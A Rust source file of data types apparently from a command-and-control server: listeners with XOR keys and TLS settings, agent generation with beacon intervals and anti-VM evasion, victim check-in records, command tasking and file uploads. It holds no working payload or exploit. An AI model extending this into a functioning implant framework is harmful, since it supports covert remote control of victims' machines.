use serde::{Deserialize, Serialize};
use std::collections::HashMap;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Listener {
    pub name: String,
    pub listener_type: String,
    pub host: String,
    pub port: u16,
    pub xor_key: String,
    pub user_agent: String,
    pub uri_paths: String,
    pub http_headers: HashMap<String, String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ListenerHttps {
    pub name: String,
    pub listener_type: String,
    pub host: String,
    pub port: u16,
    pub xor_key: String,
    pub user_agent: String,
    pub uri_paths: String,
    pub http_headers: HashMap<String, String>,
    pub tls_cert: String,
    pub tls_key: String,
    pub tls_cert_chain: String,
}

#[derive(Debug, Deserialize)]
pub struct LoginRequest {
    pub username: String,
    pub password: String,
}

#[derive(Debug, Serialize)]
pub struct LoginResponse {
    pub success: bool,
    pub token: Option<String>,
    pub message: String,
}

#[derive(Debug, Deserialize)]
pub struct TaskCommand {
    pub agent_id: String,
    pub command: String,
}

#[derive(Debug, Serialize)]
pub struct ApiResponse {
    pub success: bool,
    pub message: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct Claims {
    pub sub: String,
    pub exp: usize,
}

#[derive(Debug, Serialize)]
pub struct HealthResponse {
    pub status: String,
    pub service: String,
    pub version: String,
}

#[derive(Serialize, Deserialize)]
pub struct GenerateAgentRequest {
    pub listener_name: String,
    pub payload_type: String,
    pub config: AgentConfig,
}

#[derive(Serialize, Deserialize)]
pub struct AgentConfig {
    pub host: String,
    pub port: u16,
    pub uri_path: String,
    pub user_agent: String,
    pub xor_key: String,
    pub beacon_interval: u32,
    pub anti_vm: bool,
    pub headers: Vec<(String, String)>,
}

#[derive(Serialize, Deserialize)]
pub struct GenerateListenerRequest {
    pub listener_name: String,
    pub listener_type: String,
    pub listener_ip: String,
    pub listener_port: u16,
    pub xor_key: String,
    pub user_agent: String,
    pub uri_paths: String,
    pub headers: Vec<(String, String)>,
    #[serde(default)]
    pub tls_cert: String,
    #[serde(default)]
    pub tls_key: String,
    #[serde(default)]
    pub tls_cert_chain: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct VictimCheckinInfo {
    pub agent_id: String,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub ip_address: String,
    pub process_name: String,
}

#[derive(Serialize, Deserialize)]
pub struct AgentCheckinResponse {
    pub success: bool,
    pub message: String,
    pub commands: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VictimAgentDetails {
    pub agent_id: String,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub ip_address: String,
    pub process_name: String,
    pub first_seen: String,
    pub last_seen: String,
}

#[derive(Deserialize)]
pub struct BeaconPayload {
    pub agent_id: String,
    pub hostname: String,
    pub username: String,
    pub process_name: String,
    pub results: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ResultDetail {
    pub id: i64,
    pub agent_id: String,
    pub command_id: Option<i64>,
    pub output: String,
    pub success: bool,
    pub received_at: String,
    pub r#types: Option<String>, // "text" | "file"
    pub filename: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UploadFile {
    pub agent_id: String,
    pub filename: String,
    pub content: String, // Base64 encoded file content
}
